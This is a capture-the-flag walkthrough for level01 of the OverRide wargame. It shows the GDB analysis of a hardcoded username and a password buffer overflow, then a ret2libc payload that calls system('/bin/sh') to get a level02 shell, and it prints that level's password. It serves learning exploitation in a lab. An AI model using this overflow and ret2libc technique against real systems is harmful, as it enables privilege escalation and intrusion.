# Level01 Walkthrough

## Analyzing the Program with GDB

1. **Whats happening**:  

```bash
level01@OverRide:~$ ./level01 
********* ADMIN LOGIN PROMPT *********
Enter Username: admin
verifying username....

nope, incorrect username...
```

- We find "dat_will" with `disas verify_user_name` 
```bash
[...]
0x0804847d <+25>:    mov    $0x80486a8,%eax
[...]
(gdb) x/s 0x80486a8
0x80486a8:       "dat_wil"
```

- We can see that an overflow can happened in the password, and in the fgets functions: 

```bash
(gdb) r
Starting program: /home/users/level01/level01 
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_will
verifying username....

Enter Password: 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
nope, incorrect password...

Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? ()
(gdb) info register eip
eip            0x37634136       0x37634136 <------> offset 80
```

- Lets use a "return to libc" attack which will overwrite the EIP return address with a particular libc function address directly. 

We're going to overwrite the EIP with the address of system, "/bin/sh" and exit()

```bash
(gdb) b *main
Breakpoint 1 at 0x80484d0
(gdb) r
Breakpoint 1, 0x080484d0 in main ()
(gdb) print system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) print exit
$2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
(gdb) find &system, +999999, "/bin/sh"
Pattern not found.
(gdb) find &system, +99999999, "/bin/sh" <----- is use to look for an address in memory where the string. '+9999999999' long search
0xf7f897ec
warning: Unable to access target memory at 0xf7fd3b74, halting search.
1 pattern found.
(gdb) x/s 0xf7f897ec
0xf7f897ec:      "/bin/sh"
```

Exit() because it will segfault upon exit

2. **Payload**:  
    Payload is : 
    - USERNAME : print "dat_wil\n"
    - PADDING : "A"*80 +
    - SYSTEM : 0xf7e6aed0 but have to translate in little endian 
    - EXIT : 0xf7e5eb70 but have to translate in little endian 
    - /BIN/SH : 0xf7f897ec but have to translate in little endian 

---

## Running the Program

```bash
level01@OverRide:~$ (python -c 'print "dat_wil\n" + "A"*80 + "\xd0\xae\xe6\xf7" + "\x70\xeb\xe5\xf7" + "\xec\x97\xf8\xf7"' ; cat -) | ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password: 
nope, incorrect password...

id
uid=1001(level01) gid=1001(level01) euid=1002(level02) egid=100(users) groups=1002(level02),100(users),1001(level01)
cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
^C
```

## Moving to level02

1. **Swith User to level02**:
    Run ```su level02```

2. **Authenticate with the Password**:
    
    <!-- # - RET_ADDRESS : 
    # ```bash
    # (gdb) b verify_user_name 
    # Breakpoint 1 at 0x8048469
    # (gdb) b verify_user_pass
    # Breakpoint 2 at 0x80484a8
    # (gdb) run
    # The program being debugged has been started already.
    # Start it from the beginning? (y or n) y
    # Starting program: /home/users/level01/level01 
    # ********* ADMIN LOGIN PROMPT *********
    # Enter Username: dat_will

    # Breakpoint 1, 0x08048469 in verify_user_name ()
    # (gdb) x/32xw $esp
    # x/32xw $esp-16
    # 0xffffd680:     0xffffd708      0xf7ff0a50      0x00000000      0xffffd6bc
    # 0xffffd690:     0x00000000      0xffffd6fc      0xffffd708      0x08048532
    # 0xffffd6a0:     0x0804a040      0x00000100      0xf7fcfac0      0x00000001
    # 0xffffd6b0:     0xffffd8cd      0x0000002f      0xffffd70c      0x00000000
    # `0xffffd6c0`:     0x00000000      0x00000000      0x00000000      0x00000000 -->
 